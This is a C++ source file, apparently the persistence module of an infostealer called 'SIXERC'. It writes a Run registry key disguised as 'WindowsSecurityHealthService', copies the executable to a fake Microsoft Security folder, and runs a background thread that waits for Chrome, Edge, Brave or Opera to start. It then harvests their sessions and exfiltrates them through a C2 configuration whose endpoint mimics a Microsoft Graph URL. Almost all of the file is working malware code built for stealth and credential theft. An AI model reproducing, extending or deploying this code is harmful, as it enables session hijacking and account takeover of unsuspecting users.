// ============================================================================
// SIXERC — PH Implementation
// ============================================================================

#include "modules/ph.hpp"
#include "core/utils.hpp"
#include "core/crypto.hpp"
#include "core/obfuscation.hpp"
#include "modules/bps.hpp"
#include "modules/ep.hpp"
#include <windows.h>
#include <string>
#include <thread>
#include <chrono>
#include <tlhelp32.h>

namespace sixerc::ph {

bool install_registry_persistence(const std::wstring& exe_path) {
    std::wstring reg_path = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    std::wstring value_name = L"WindowsSecurityHealthService";
    
    // Disguised as a system service
    std::wstring cmd = L"\"" + exe_path + L"\" /background";
    
    return utils::registry_write(HKEY_CURRENT_USER, reg_path, value_name, cmd);
}

bool install_task_persistence(const std::wstring& exe_path) {
    // Uses COM interface for scheduled tasks — simplified version
    // For production, use ITaskService COM interface
    return false;
}

void monitor_browser_sessions() {
    // This runs in a background thread
    std::vector<std::wstring> browser_names = {
        L"chrome.exe", L"msedge.exe", L"brave.exe", L"opera.exe"
    };
    
    std::map<std::wstring, bool> was_running;
    for (const auto& name : browser_names) {
        was_running[name] = false;
    }
    
    while (true) {
        for (const auto& name : browser_names) {
            bool running = utils::is_process_running(name);
            
            if (running && !was_running[name]) {
                // Browser just started — wait for it to settle then harvest
                obf::stealth_sleep(5000);
                
                auto sessions = bps::harvest_all_sessions();
                if (!sessions.empty()) {
                    // Quick exfil of new sessions
                    // Use minimal config for background operation
                    C2Config cfg;
                    cfg.primary_endpoint = "https://graph.microsoft.com/v1.0/$metadata";
                    cfg.rsa_public_key_pem = ""; // Would be loaded from config
                    
                    std::vector<ServiceData> empty_services;
                    ep::exfiltrate(sessions, empty_services, cfg);
                }
            }
            
            was_running[name] = running;
        }
        
        std::this_thread::sleep_for(std::chrono::seconds(30));
    }
}

bool establish_persistence() {
    wchar_t exe_path[MAX_PATH];
    if (GetModuleFileNameW(nullptr, exe_path, MAX_PATH) == 0) {
        return false;
    }
    
    // Copy to a disguised location
    std::wstring target_dir = utils::get_local_appdata_path() + L"\\Microsoft\\Windows\\Security";
    CreateDirectoryW(target_dir.c_str(), nullptr);
    
    std::wstring target_path = target_dir + L"\\HealthService.exe";
    
    if (!utils::file_exists(target_path)) {
        CopyFileW(exe_path, target_path.c_str(), FALSE);
    }
    
    bool ok = install_registry_persistence(target_path);
    
    // Start monitoring thread
    std::thread monitor(monitor_browser_sessions);
    monitor.detach();
    
    return ok;
}

bool remove_persistence() {
    std::wstring reg_path = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    std::wstring value_name = L"WindowsSecurityHealthService";
    
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, reg_path.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueW(hKey, value_name.c_str());
        RegCloseKey(hKey);
    }
    
    std::wstring target_path = utils::get_local_appdata_path() + 
        L"\\Microsoft\\Windows\\Security\\HealthService.exe";
    utils::delete_file_secure(target_path);
    
    return true;
}

} // namespace sixerc::ph
